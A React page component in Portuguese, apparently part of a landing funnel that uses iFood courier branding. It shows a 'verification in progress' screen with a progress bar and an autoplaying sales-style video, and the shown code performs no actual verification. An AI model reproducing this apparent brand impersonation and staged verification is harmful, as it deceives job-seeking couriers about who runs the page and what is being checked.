import React, { useEffect } from 'react';

export default function ProcessandoPage() {
  useEffect(() => {
    const previousPage = document.body.dataset.page || '';
    document.body.dataset.page = 'processing';

    return () => {
      if (previousPage) {
        document.body.dataset.page = previousPage;
      } else {
        delete document.body.dataset.page;
      }
    };
  }, []);

  return (
    <>
      <header className="header">
        <div className="logo-container">
          <img
            src="/assets/ifoodentregadores.webp"
            alt="iFood Entregador"
            className="ifood-logo ifood-logo--wide"
          />
        </div>
      </header>

      <noscript className="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

      <main className="container">
        <section className="step" aria-hidden="false">
          <h2 className="processing-title">Verificacao em andamento...</h2>
          <div id="processing-text" className="processing-subtitle" role="status" aria-live="polite">
            Iniciando verificacao segura...
          </div>

          <div className="processing-status">
            <div id="processing-progress" className="processing-progress" aria-hidden="true">
              <div className="processing-progress-segments" aria-hidden="true">
                <span className="processing-segment">
                  <i />
                </span>
                <span className="processing-segment">
                  <i />
                </span>
                <span className="processing-segment">
                  <i />
                </span>
                <span className="processing-segment">
                  <i />
                </span>
                <span className="processing-segment">
                  <i />
                </span>
                <span className="processing-segment">
                  <i />
                </span>
              </div>
              <span id="processing-progress-label" className="processing-progress-label">
                0%
              </span>
            </div>

            <div id="processing-verified" className="verified-icon hidden" aria-hidden="true">
              <svg viewBox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
                <path d="M9.2 16.6 4.7 12l1.6-1.6 2.9 2.9 8-8 1.6 1.6Z" />
              </svg>
            </div>
          </div>

          <div className="video-card">
            <div id="vsl-frame" className="vsl-frame">
              <video
                id="vsl-video"
                className="vsl-video"
                playsInline
                preload="metadata"
                poster="/assets/vsl-poster.webp"
                autoPlay
                controls
              >
                <source src="/assets/vsl.mp4" type="video/mp4" />
              </video>

              <div id="vsl-audio-overlay" className="vsl-overlay hidden" aria-hidden="true">
                <div className="vsl-overlay-content">
                  <strong>Toque para ouvir</strong>
                  <span>Ative o audio para continuar a verificacao</span>
                </div>
                <button id="vsl-audio-btn" className="vsl-overlay-btn" type="button">
                  Ativar audio
                </button>
              </div>
            </div>

            <p className="small-text">Assista ao recado enquanto validamos sua solicitacao.</p>
          </div>
        </section>
      </main>

      <div id="toast" className="toast hidden" role="status" aria-live="polite" />

      <footer className="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
      </footer>
    </>
  );
}
